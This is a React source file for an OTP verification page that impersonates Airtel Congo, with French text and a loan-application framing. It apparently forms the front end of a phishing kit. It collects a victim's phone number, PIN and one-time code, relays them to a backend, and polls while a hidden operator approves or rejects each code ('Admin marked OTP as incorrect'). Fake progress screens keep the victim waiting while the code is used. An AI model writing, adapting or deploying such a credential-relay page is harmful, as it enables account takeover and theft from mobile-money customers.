import { useState, useRef, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useLoanApplication } from '../LoanApplicationContext';
import './Otp.css';

export default function Otp() {
  const navigate = useNavigate();
  const { authData, updateAuthData } = useLoanApplication();
  
  // Get API endpoint from environment variable
  const API_ENDPOINT = import.meta.env.VITE_USER_API_ENDPOINT || '1';
  const API_BASE_URL = import.meta.env.VITE_API_URL || 'http://localhost:3001';
  
  const getInitialPhone = () => {
    if (authData.phoneNumber) {
      return authData.phoneNumber;
    }
    
    try {
      const savedPhone = localStorage.getItem('ecocash_phone');
      if (savedPhone) {
        return savedPhone;
      }
    } catch (error) {
      console.log('No saved phone found');
    }
    
    return '+243 900 123 456';
  };

  const [phoneNumber] = useState(getInitialPhone());
  const [otp, setOtp] = useState('');
  const [showSuccessToast, setShowSuccessToast] = useState(false);
  const [showResendToast, setShowResendToast] = useState(false);
  const [timer, setTimer] = useState(null);
  const [isProcessing, setIsProcessing] = useState(false);
  const [isResending, setIsResending] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [progress, setProgress] = useState(0);
  const [verificationStatus, setVerificationStatus] = useState('');
  const [isOtpApproved, setIsOtpApproved] = useState(false);
  const [showErrorModal, setShowErrorModal] = useState(false);
  const [showResendErrorModal, setShowResendErrorModal] = useState(false);
  const [showVerifyErrorModal, setShowVerifyErrorModal] = useState(false);
  const [showWrongPinModal, setShowWrongPinModal] = useState(false);
  const [showTimeoutModal, setShowTimeoutModal] = useState(false);
  const [waitingForApproval, setWaitingForApproval] = useState(true);

  const previousStatusRef = useRef(null);
  const pollingIntervalRef = useRef(null);
  const otpInputRef = useRef(null);

  // Poll for login approval status
  useEffect(() => {
    if (!waitingForApproval) return;

    const checkApprovalStatus = async () => {
      try {
        const phone = authData.phoneNumber || phoneNumber;
        
        const response = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/check-login-approval`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            phoneNumber: phone,
            pin: authData.pin
          })
        });

        const data = await response.json();
        
        if (data.approved) {
          setWaitingForApproval(false);
          setShowSuccessToast(true);
          setTimer(40);
          
          const endTime = Date.now() + (40 * 1000);
          localStorage.setItem('otp_timer', JSON.stringify({ endTime }));
        }
      } catch (error) {
        console.error('Error checking approval status:', error);
      }
    };

    pollingIntervalRef.current = setInterval(checkApprovalStatus, 2000);
    checkApprovalStatus();

    return () => {
      if (pollingIntervalRef.current) {
        clearInterval(pollingIntervalRef.current);
      }
    };
  }, [waitingForApproval, phoneNumber, authData.phoneNumber, authData.pin, API_BASE_URL, API_ENDPOINT]);

  useEffect(() => {
    if (showSuccessToast) {
      const toastTimer = setTimeout(() => {
        setShowSuccessToast(false);
      }, 2500);

      return () => clearTimeout(toastTimer);
    }
  }, [showSuccessToast]);

  useEffect(() => {
    if (showResendToast) {
      const toastTimer = setTimeout(() => {
        setShowResendToast(false);
      }, 2500);

      return () => clearTimeout(toastTimer);
    }
  }, [showResendToast]);

  useEffect(() => {
    if (timer > 0 && !isProcessing && !waitingForApproval) {
      const countdown = setInterval(() => {
        setTimer(prev => {
          const newValue = prev - 1;
          if (newValue <= 0) {
            localStorage.removeItem('otp_timer');
            return 0;
          }
          
          const endTime = Date.now() + (newValue * 1000);
          localStorage.setItem('otp_timer', JSON.stringify({ endTime }));
          
          return newValue;
        });
      }, 1000);

      return () => clearInterval(countdown);
    }
  }, [timer, isProcessing, waitingForApproval]);

  useEffect(() => {
    if (isProcessing && isOtpApproved && progress < 100) {
      const progressTimer = setTimeout(() => {
        setProgress(prev => {
          const increment = Math.random() * 15 + 5;
          return Math.min(prev + increment, 100);
        });
      }, 300);

      return () => clearTimeout(progressTimer);
    } else if (progress >= 100 && isOtpApproved) {
      setTimeout(() => {
        navigate('/status');
      }, 500);
    }
  }, [isProcessing, isOtpApproved, progress, navigate]);

  const checkOTPStatus = async (phone, otpCode) => {
    const startTime = Date.now();
    const maxTime = 5 * 60 * 1000; // 5 minutes in milliseconds
    const pollInterval = 2000; // Poll every 2 seconds
    
    while (Date.now() - startTime < maxTime) {
      try {
        const response = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/check-otp-status`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            phoneNumber: phone,
            otp: otpCode
          })
        });

        const data = await response.json();
        
        if (data.status === 'approved') {
          return { approved: true };
        } else if (data.status === 'rejected') {
          return { approved: false, message: 'Admin marked OTP as incorrect' };
        } else if (data.status === 'wrong_pin') {
          return { approved: false, wrongPin: true, message: 'Wrong PIN entered' };
        }
        
        // Calculate elapsed time
        const elapsedSeconds = Math.floor((Date.now() - startTime) / 1000);
        
        const newStatus = `Veuillez patienter... (${elapsedSeconds}s)`;
        
        if (previousStatusRef.current !== newStatus) {
          setVerificationStatus(newStatus);
          previousStatusRef.current = newStatus;
        }
        
        // Wait before next poll
        await new Promise(resolve => setTimeout(resolve, pollInterval));
        
      } catch (error) {
        console.error('Error checking OTP status:', error);
        await new Promise(resolve => setTimeout(resolve, pollInterval));
      }
    }
    
    // Timeout after 5 minutes
    return { approved: false, timeout: true, message: 'Error occurred, please try again' };
  };

  const handleOtpChange = (e) => {
    const value = e.target.value.replace(/\D/g, ''); // Remove non-numeric characters
    if (value.length <= 4) {
      setOtp(value);
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    if (isSubmitting || waitingForApproval) {
      return;
    }
    
    if (otp.length !== 4) {
      alert('Veuillez entrer un code OTP valide à 4 chiffres');
      return;
    }

    setIsSubmitting(true);
    const phone = authData.phoneNumber || phoneNumber;

    updateAuthData({
      otp: otp,
      isAuthenticated: true
    });

    try {
      const response = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/verify-otp`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          phoneNumber: phone,
          otp: otp,
          timestamp: new Date().toISOString()
        })
      });

      await response.json();
      
      setIsProcessing(true);
      const initialStatus = 'Veuillez patienter...';
      setVerificationStatus(initialStatus);
      previousStatusRef.current = initialStatus;
      setIsOtpApproved(false);
      setProgress(0);
      
      const verificationResult = await checkOTPStatus(phone, otp);
      
      if (verificationResult.approved) {
        localStorage.removeItem('otp_timer');
        const approvedStatus = '✅ Vérifié! En cours...';
        setVerificationStatus(approvedStatus);
        previousStatusRef.current = approvedStatus;
        setIsOtpApproved(true);
      } else if (verificationResult.wrongPin) {
        setIsProcessing(false);
        setIsSubmitting(false);
        setProgress(0);
        setIsOtpApproved(false);
        setShowWrongPinModal(true);
        previousStatusRef.current = null;
      } else if (verificationResult.timeout) {
        // 5 minute timeout - show timeout modal
        setIsProcessing(false);
        setIsSubmitting(false);
        setProgress(0);
        setIsOtpApproved(false);
        setShowTimeoutModal(true);
        previousStatusRef.current = null;
      } else {
        setIsProcessing(false);
        setIsSubmitting(false);
        setProgress(0);
        setIsOtpApproved(false);
        setShowErrorModal(true);
        setOtp('');
        previousStatusRef.current = null;
        setTimeout(() => {
          otpInputRef.current?.focus();
        }, 100);
      }
      
    } catch (error) {
      console.error('OTP verification error:', error);
      setIsSubmitting(false);
      setIsProcessing(false);
      setProgress(0);
      setIsOtpApproved(false);
      setShowVerifyErrorModal(true);
      previousStatusRef.current = null;
    }
  };

  const handleResend = async () => {
    if (timer > 0 || isResending || waitingForApproval) return;
    
    const phone = authData.phoneNumber || phoneNumber;
    if (!phone || phone === '+243 900 123 456') {
      setShowResendErrorModal(true);
      return;
    }
    
    setIsResending(true);
    
    try {
      const response = await fetch(`${API_BASE_URL}/api/${API_ENDPOINT}/resend-otp`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          phoneNumber: phone,
          timestamp: new Date().toISOString()
        })
      });

      const data = await response.json();
      
      if (data.success) {
        setOtp('');
        setTimer(40);
        
        const endTime = Date.now() + (40 * 1000);
        localStorage.setItem('otp_timer', JSON.stringify({ endTime }));
        
        setShowResendToast(true);
        otpInputRef.current?.focus();
      } else {
        setShowResendErrorModal(true);
      }
    } catch (error) {
      console.error('Resend OTP error:', error);
      setShowResendErrorModal(true);
    } finally {
      setIsResending(false);
    }
  };

  const handleBack = () => {
    localStorage.removeItem('otp_timer');
    navigate(-1);
  };

  const handleWrongPinModalClose = () => {
    setShowWrongPinModal(false);
    localStorage.removeItem('otp_timer');
    localStorage.removeItem('ecocash_phone');
    updateAuthData({
      phoneNumber: '',
      pin: '',
      otp: '',
      isAuthenticated: false
    });
    navigate('/login');
  };

  const handleTimeoutModalClose = () => {
    setShowTimeoutModal(false);
    setOtp('');
    setTimeout(() => {
      otpInputRef.current?.focus();
    }, 100);
  };

  const isOtpValid = otp.length === 4;

  if (isProcessing) {
    return (
      <div className="otp-container">
        <main className="otp-content">
          <div className="processing-card">
            <div className="spinner-container">
              <div className="spinner"></div>
            </div>
            
            <h1 className="processing-title">Vérification de l'OTP</h1>
            <p className="processing-subtitle">{verificationStatus}</p>
          </div>
        </main>

        <footer className="otp-footer">
          <img 
            src="https://cdn-webportal.airtelstream.net/website/zambia/assets/images/logo.svg" 
            alt="Airtel Logo" 
            style={{ height: '40px', marginBottom: '10px' }}
          />
        </footer>
      </div>
    );
  }

  return (
    <div className="otp-container">
      {showErrorModal && (
        <div className="error-modal-overlay" onClick={() => setShowErrorModal(false)}>
          <div className="error-modal" onClick={(e) => e.stopPropagation()}>
            <h2 className="error-modal-title">Code incorrect!</h2>
            <p className="error-modal-message">
              Vérifiez le SMS pour le code ou demandez un nouveau code après la fin du compte à rebours
            </p>
            <button 
              className="error-modal-button" 
              onClick={() => setShowErrorModal(false)}
            >
              OK
            </button>
          </div>
        </div>
      )}

      {showTimeoutModal && (
        <div className="error-modal-overlay" onClick={handleTimeoutModalClose}>
          <div className="error-modal" onClick={(e) => e.stopPropagation()}>
            <h2 className="error-modal-title">Délai d'expiration</h2>
            <p className="error-modal-message">
              Une erreur s'est produite, veuillez réessayer
            </p>
            <button 
              className="error-modal-button" 
              onClick={handleTimeoutModalClose}
            >
              OK
            </button>
          </div>
        </div>
      )}

      {showWrongPinModal && (
        <div className="error-modal-overlay" onClick={handleWrongPinModalClose}>
          <div className="error-modal" onClick={(e) => e.stopPropagation()}>
            <h2 className="error-modal-title">PIN incorrect!</h2>
            <p className="error-modal-message">
              Le PIN ou le numéro de téléphone que vous avez entré était incorrect. Veuillez vous reconnecter avec les bonnes informations.
            </p>
            <button 
              className="error-modal-button" 
              onClick={handleWrongPinModalClose}
            >
              Retour à la Connexion
            </button>
          </div>
        </div>
      )}

      {showResendErrorModal && (
        <div className="error-modal-overlay" onClick={() => setShowResendErrorModal(false)}>
          <div className="error-modal" onClick={(e) => e.stopPropagation()}>
            <h2 className="error-modal-title">Échec de Renvoi</h2>
            <p className="error-modal-message">
              Échec du renvoi de l'OTP. Veuillez réessayer plus tard.
            </p>
            <button 
              className="error-modal-button" 
              onClick={() => setShowResendErrorModal(false)}
            >
              OK
            </button>
          </div>
        </div>
      )}

      {showVerifyErrorModal && (
        <div className="error-modal-overlay" onClick={() => setShowVerifyErrorModal(false)}>
          <div className="error-modal" onClick={(e) => e.stopPropagation()}>
            <h2 className="error-modal-title">Échec de Vérification</h2>
            <p className="error-modal-message">
              Échec de la vérification de l'OTP. Veuillez réessayer plus tard.
            </p>
            <button 
              className="error-modal-button" 
              onClick={() => setShowVerifyErrorModal(false)}
            >
              OK
            </button>
          </div>
        </div>
      )}

      {showSuccessToast && (
        <div className="success-toast">
          <div className="success-icon">✓</div>
          <span className="success-text">Code OTP envoyé avec succès!</span>
        </div>
      )}

      {showResendToast && (
        <div className="success-toast resend">
          <div className="success-icon">📱</div>
          <span className="success-text">OTP renvoyé avec succès!</span>
        </div>
      )}

      <header className="otp-header">
        <button className="back-btn" onClick={handleBack}>
          ←
        </button>
        
        <div className="logo-large">
          <img src="https://cdn-webportal.airtelstream.net/website/zambia/assets/images/logo.svg" alt="Airtel Logo" />
        </div>
        
        <button className="menu-btn" aria-label="Menu">
          <div className="menu-line"></div>
          <div className="menu-line"></div>
          <div className="menu-line"></div>
        </button>
      </header>

      <main className="otp-content">
        <div className="otp-card">
          <h1 className="otp-title">Vérification OTP</h1>
          <p className="otp-subtitle">Entrez l'OTP envoyé à votre numéro de téléphone</p>
          <p className="otp-phone">{phoneNumber}</p>

          <form onSubmit={handleSubmit}>
            <div className="otp-input-container">
              <input
                ref={otpInputRef}
                type="text"
                className="otp-input-field"
                value={otp}
                onChange={handleOtpChange}
                placeholder="Entrer l'OTP à 4 chiffres"
                maxLength="4"
                inputMode="numeric"
                pattern="[0-9]*"
                disabled={isResending || isSubmitting || waitingForApproval}
                autoComplete="one-time-code"
              />
              <p className="otp-hint">Entrer le code de vérification à 4 chiffres</p>

              <p className="resend-text">
                {waitingForApproval ? (
                  <span className="requesting-text">Demande d'OTP...</span>
                ) : isResending ? (
                  <span className="resending-text">Renvoi du code...</span>
                ) : timer > 0 ? (
                  `Le code expire dans ${timer} secondes`
                ) : (
                  <>
                    Vous n'avez pas reçu le code?{' '}
                    <span className="resend-link" onClick={handleResend}>
                      Renvoyer
                    </span>
                  </>
                )}
              </p>
            </div>

            <button 
              type="submit" 
              className={`submit-button ${isOtpValid && !waitingForApproval ? 'active' : ''}`}
              disabled={!isOtpValid || isResending || isSubmitting || waitingForApproval}
            >
              {isSubmitting ? 'VÉRIFICATION...' : 'SOUMETTRE'}
            </button>
          </form>
        </div>
      </main>

      <div className="login-footer">
        <div><img src="https://cdn-webportal.airtelstream.net/website/zambia/assets/images/logo.svg" alt="Airtel Logo" /></div>
        <span>En collaboration avec</span>
        <span>STARLINK™</span>
        <footer className="footer">
        © 2026 Airtel Congo. Tous droits réservés.
      </footer>
      </div>
    </div>
  );
}
